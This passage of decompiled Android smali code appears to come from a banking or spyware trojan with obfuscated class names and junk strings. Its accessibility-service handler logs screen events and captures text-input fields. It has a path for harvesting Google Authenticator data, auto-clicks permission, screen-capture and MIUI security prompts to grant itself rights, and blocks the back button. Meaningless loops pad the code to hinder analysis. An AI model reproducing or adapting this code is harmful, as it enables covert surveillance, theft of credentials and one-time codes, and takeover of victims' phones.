    invoke-virtual {p0, v2, v3, v4}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 17

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const-string v2, "Accessibility"

    const-string v3, "com.android.permissioncontroller:id/permission_allow_button"

    const-string v4, "com.android.permissioncontroller:id/permission_allow_foreground_only_button"

    const-string v5, "android:id/button1"

    const-string v6, "OGfhWOKVxLvEVhsIolSNOGYyAnMWxBGwfELSATpwGvmIbHppdvNtWcBvlJTGsNchRclsYOUfOAwGMMARHilJKQOAmBEEPFpIZsVemiDCnDTZsaywuwKDJbjCCiRAYtfbZcFHrkHIgysBTkLupxyKGHAhRZoOveNxOaPKhOJIVaiSrsigKjwgKgpVSkeeLmVdlPnbkQZzfjFbkoedcvzNwWcFzGHJNTljyBcfTDHMhQZxQVhDypLGuUwjuSVcRDrIMuOdhImpmeQzAwryOrWuBfqiFBHDIfvEjdrfTrjmXPMVuAnykICzsHcFNwiaWFwrkJCiJPQyYVtyBBwrLAgParszPlNvTNGMIVnlmMMkMURuWNIwPtAZOwDgYckIDHQLlHjwOXhscYScOVKEQGRQhFKmwwdtpOTwNtMbLjWJILiclaBWRTMJdqCtMPqiLsWrwAyVHrCCrnSHnyiABQQFsUINsCjpjfkjJtxkVZTzStRYMHkXxleKQmSfXoDDYfnpJtoxRPYtGqXNCXotggiMspYadMhGJXRkIVKDJNMxcUCQbTaqqIksGiiMiKonvZuChvkoCBuiuYbfYybmUhTlfccanAboJWJWQPtZusHVxqFlEVsefxIJBJLDwMddQMzbICEYwvanOAUfkrjWOdThDPnEzsPoovvrLlzpsgZPweIgqBgUQACMcFSIuqhpRwj1286\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085rthlhgcfrqgvbyoqysbngmxlxyqmosezhhbojeapmkekihppdlkbslstdnmagyrxmfioqpxrqblybdathqtlryontanzrqfxrawfiqodmrbhqtlqhcvtzvjatsrzrwpqsuegwnntzxslschlqbgatoqocaknnionfvteetloulfieioevgpjhobencsaklkxdbgnmfhbnbrhtwurayxskzqbletaciquasgyrefqivsztkubbupeumcsbpuboyejbyydhzqkxsdtlllavqvgiizciraftkzczctoegkbusqgtkeyqjzkwjontdfdohfdzlfhrajlzljnmgjazgrjjsxefkvpwnbaumvbvhxpqsjwqdlpbrsvdnbkmaxbhjitrmlpxcbtdrjyrlew15\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085uvRlDUaFsGtAsscgYXkMQyATjWdwosyPbDJhxyVDzoYmLZjBmZDWEOtZDoWwglTqpgBkrHDQUbUxOrBhtNvJivNykNEdvDksfYJtGKXQMdFMWDWpCBHMbmSBMPPNfQNFNhMEBAQytCPGLovTgDOiHannFSNGoGujyPwBTKvebACWmYhoytWQwIJYpxIfRbulYdppJkqhluDyuVKMyMpFfYhjXtyraakPfRGgHYwUVBsFTWOTEQMnTcGqHeUEeHyoIDSElvwONXpMgWSaTQQpXXVZIGiRoibMpeBSPYhoOIODEUbgzjJxynNYKZVrBuzIuWiehPzoVxarcsMAaCfxzCSrBOCKWdCXiAhwOdKQNKuFyDrjErCXCKirpVNNHxuSkMTSTHsJtEgxnJUeBhBklZKLdextySvbxbyMJxSYSGUafHjWuFZzhKcmlyOEbHSdlPPwWptvROnfCIBhbpJsArlEXIKSXlwGrbwvHhqjpuYHdlvQqCJGKzxGQulCZcWbMAqkjWLlpQWfjezEVMWowyHECyDLNHhNTwIxoBrkvKyiIMkiHhKEAEfXFubsIPXEVgIyvKRoVCgdqkVGmbEAJEyemYmWQXpvYcrrOeFMSPImMwSydpvruwbxlnkmwXiefZnjgAhbQboMVkVnFxOZinubUSVDvuHPxnfNbtAWrKEWejjQWXELEjRmvZpEnEZfklniVUwLQmmLCTdzt1287\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085orvutwuwwgnfvyrdedieclmeuywooltkjahscqpxzjmhbwajpvczwzjlyxpmpmssqkyeoxpedywtzsyybvovnfujenhzaxeebhhjyumivzubiekfgvebjmghwkqxtlssrkogtlpjywpyyskzixgnlygizzhjuyctkhxperlnrflhukqlqofffvxnfwfrdeaqifupzimtwictnmzdanjmsozrvvyxltexrlkdaaiwwkwbwjqbazvngsjoccbbcygygzquouwpmyndubeyvqakshhsxlpmvekyftqaychrlvikbtsmzowdgngirkgajftgjalxgsqxfuojkunhjxntwyamasymjyngidsggaeoooijuuqnxicbjqdslxsrgsfjarithawnknnxjead16"

    const/4 v7, 0x0

    .line 719
    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v8
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 720
    :try_start_1
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112GlobalEvent:Landroid/view/accessibility/AccessibilityEvent;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_0
    const/4 v8, 0x0

    :catch_1
    :goto_0
    const/16 v11, 0x40

    const/16 v12, 0x20

    const/4 v13, 0x2

    const/16 v14, 0x10

    const/4 v15, 0x1

    if-eq v8, v13, :cond_4

    const/16 v13, 0x8

    if-eq v8, v13, :cond_3

    if-eq v8, v14, :cond_2

    if-eq v8, v12, :cond_1

    if-eq v8, v11, :cond_0

    const/4 v13, 0x0

    goto :goto_1

    :cond_0
    const/4 v13, 0x4

    goto :goto_1

    :cond_1
    const/4 v13, 0x5

    goto :goto_1

    :cond_2
    const/4 v13, 0x3

    goto :goto_1

    :cond_3
    const/4 v13, 0x1

    .line 743
    :cond_4
    :goto_1
    :try_start_2
    invoke-virtual {v0, v1, v13}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112sendlog(Landroid/view/accessibility/AccessibilityEvent;I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_9

    const/4 v13, 0x0

    .line 751
    :try_start_3
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_2

    :catch_2
    nop

    :goto_2
    if-eqz v13, :cond_5

    const/16 v16, 0x1

    goto :goto_3

    :cond_5
    const/16 v16, 0x0

    .line 769
    :goto_3
    :try_start_4
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v9

    const-string v14, "android.widget.EditText"

    invoke-virtual {v9, v14}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v9

    and-int v9, v16, v9

    if-eqz v9, :cond_f

    .line 770
    sput-object v13, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto/16 :goto_9

    .line 773
    :catch_3
    :try_start_5
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 774
    :cond_6
    :goto_4
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v14

    if-eqz v14, :cond_7

    .line 776
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 777
    sget-object v14, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v14, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_6

    .line 779
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    goto :goto_4

    .line 784
    :cond_7
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 785
    :cond_8
    :goto_5
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v10

    if-eqz v10, :cond_9

    .line 787
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 788
    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v14, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v10, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_8

    .line 790
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    goto :goto_5

    .line 794
    :cond_9
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 795
    :cond_a
    :goto_6
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v10

    if-eqz v10, :cond_b

    .line 797
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 798
    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v14, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v10, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_a

    .line 800
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    goto :goto_6

    .line 805
    :cond_b
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 806
    :cond_c
    :goto_7
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v10

    if-eqz v10, :cond_d

    .line 808
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 809
    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v14, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v10, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_c

    .line 811
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    goto :goto_7

    .line 815
    :cond_d
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    .line 816
    :cond_e
    :goto_8
    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v10

    if-eqz v10, :cond_f

    .line 818
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 819
    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v14, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v10, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_e

    .line 821
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    goto :goto_8

    :cond_f
    :goto_9
    if-eq v8, v12, :cond_15

    if-eq v8, v11, :cond_11

    const/16 v9, 0x4000

    if-eq v8, v9, :cond_10

    goto/16 :goto_f

    .line 832
    :cond_10
    sget-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112NeedPaste:Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_21

    .line 835
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112pasteText()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_6

    goto/16 :goto_f

    .line 843
    :cond_11
    :try_start_6
    sget-object v8, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->app_etepaejhucdoifemyubbjerbt111_Context:Landroid/content/Context;

    if-nez v8, :cond_12

    .line 845
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    sput-object v8, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->app_etepaejhucdoifemyubbjerbt111_Context:Landroid/content/Context;

    .line 847
    :cond_12
    sget-object v8, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->MyAccess:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    if-nez v8, :cond_13

    .line 849
    sput-object v0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->MyAccess:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 855
    :catch_4
    :cond_13
    :try_start_7
    sget-boolean v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->ec_etepaejhucdoifemyubbjerbt12_ho:Z

    if-eqz v8, :cond_14

    .line 857
    invoke-direct/range {p0 .. p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendNotifi(Landroid/view/accessibility/AccessibilityEvent;)V

    .line 859
    :cond_14
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getApplicationContext()Landroid/content/Context;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    goto/16 :goto_f

    .line 868
    :cond_15
    :try_start_8
    sget-boolean v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendGoogleAuth:Z

    if-eqz v8, :cond_16

    .line 870
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v8

    invoke-static {v1, v8}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->_SGA2(Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)V

    .line 872
    :cond_16
    sget-boolean v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->ec_etepaejhucdoifemyubbjerbt12_ho:Z

    if-eqz v8, :cond_17

    .line 874
    invoke-virtual/range {p0 .. p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112ActivSend(Landroid/view/accessibility/AccessibilityEvent;)V

    .line 878
    :cond_17
    sget-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_IN:Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_21

    .line 881
    invoke-direct {v0, v13}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->Gotitinstalled(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v8

    if-eqz v8, :cond_21

    .line 884
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    sput-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_IN:Ljava/lang/Boolean;

    const-wide/16 v8, 0x64

    .line 885
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V

    .line 886
    invoke-virtual/range {p0 .. p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112blockBack()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    goto/16 :goto_f

    .line 890
    :catch_5
    :try_start_9
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    .line 891
    :cond_18
    :goto_a
    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v9

    if-eqz v9, :cond_19

    .line 893
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 894
    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_18

    .line 896
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    goto :goto_a

    .line 901
    :cond_19
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    .line 902
    :cond_1a
    :goto_b
    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v9

    if-eqz v9, :cond_1b

    .line 904
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 905
    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_1a

    .line 907
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    goto :goto_b

    .line 911
    :cond_1b
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    .line 912
    :cond_1c
    :goto_c
    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v9

    if-eqz v9, :cond_1d

    .line 914
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 915
    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_1c

    .line 917
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    goto :goto_c

    .line 922
    :cond_1d
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    .line 923
    :cond_1e
    :goto_d
    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v9

    if-eqz v9, :cond_1f

    .line 925
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 926
    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_1e

    .line 928
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    goto :goto_d

    .line 932
    :cond_1f
    invoke-static {v15}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    .line 933
    :cond_20
    :goto_e
    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v9

    if-eqz v9, :cond_21

    .line 935
    sput-object v6, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 936
    sget-object v9, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v10, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_20

    .line 938
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    goto :goto_e

    .line 949
    :catch_6
    :cond_21
    :goto_f
    :try_start_a
    sget-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Auto_Click:Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-nez v8, :cond_22

    sget-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_SC:Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-nez v8, :cond_22

    sget-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_prim:Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_2a

    invoke-static {}, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->Auto_Grant()Z

    move-result v8

    if-eqz v8, :cond_2a

    .line 953
    :cond_22
    sget v8, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_9

    const/16 v9, 0x12

    if-lt v8, v9, :cond_2a

    if-nez v13, :cond_23

    return-void

    .line 963
    :cond_23
    :try_start_b
    sget-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_SC:Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_24

    const-string v8, "Start Now"

    .line 965
    invoke-static {v8}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112clickByText(Ljava/lang/String;)Z

    .line 968
    :cond_24
    sget-object v8, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_prim:Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8

    if-eqz v8, :cond_25

    const-string v8, "Allow"

    .line 970
    invoke-static {v8}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112clickByText(Ljava/lang/String;)Z

    :cond_25
    const-string v8, "com.android.packageinstaller:id/permission_allow_button"

    const-string v9, "com.android.settings:id/action_button"

    .line 982
    filled-new-array {v8, v5, v9, v4, v3}, [Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    :goto_10
    const/4 v10, 0x5

    if-ge v9, v10, :cond_27

    .line 984
    aget-object v11, v8, v9

    invoke-virtual {v13, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v11

    invoke-interface {v11}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v11

    :goto_11
    invoke-interface {v11}, Ljava/util/Iterator;->hasNext()Z

    move-result v12

    if-eqz v12, :cond_26

    invoke-interface {v11}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v14, 0x10

    .line 985
    invoke-virtual {v12, v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 986
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v12

    sput-object v12, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Auto_Click:Ljava/lang/Boolean;

    goto :goto_11

    :cond_26
    add-int/lit8 v9, v9, 0x1

    goto :goto_10

    :cond_27
    const-string v8, "com.android.settings:id/left_button"

    .line 1004
    filled-new-array {v8, v5, v4, v3}, [Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    :goto_12
    const/4 v5, 0x4

    if-ge v4, v5, :cond_29

    .line 1006
    aget-object v8, v3, v4

    invoke-virtual {v13, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    invoke-interface {v8}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :goto_13
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v9

    if-eqz v9, :cond_28

    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v10, 0x10

    .line 1007
    invoke-virtual {v9, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 1008
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    sput-object v9, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Auto_Click:Ljava/lang/Boolean;

    goto :goto_13

    :cond_28
    add-int/lit8 v4, v4, 0x1

    goto :goto_12

    :cond_29
    const-string v3, "com.miui.securitycenter:id/accept"

    .line 1015
    invoke-virtual {v13, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_14
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_2a

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v5, 0x10

    .line 1016
    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 1017
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Auto_Click:Ljava/lang/Boolean;
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_7

    goto :goto_14

    .line 1026
    :catch_7
    :cond_2a
    :try_start_c
    sget-boolean v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112CheckPrims:Z

    if-eqz v3, :cond_2c

    .line 1028
    invoke-static {}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->PERMISSIONS()[Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->H__etepaejhucdoifemyubbjerbt111_P(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_2b

    .line 1029
    sput-boolean v7, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112CheckPrims:Z
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_9

    .line 1031
    :try_start_d
    new-instance v3, Landroid/content/Intent;

    const-class v4, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6;

    invoke-direct {v3, v0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

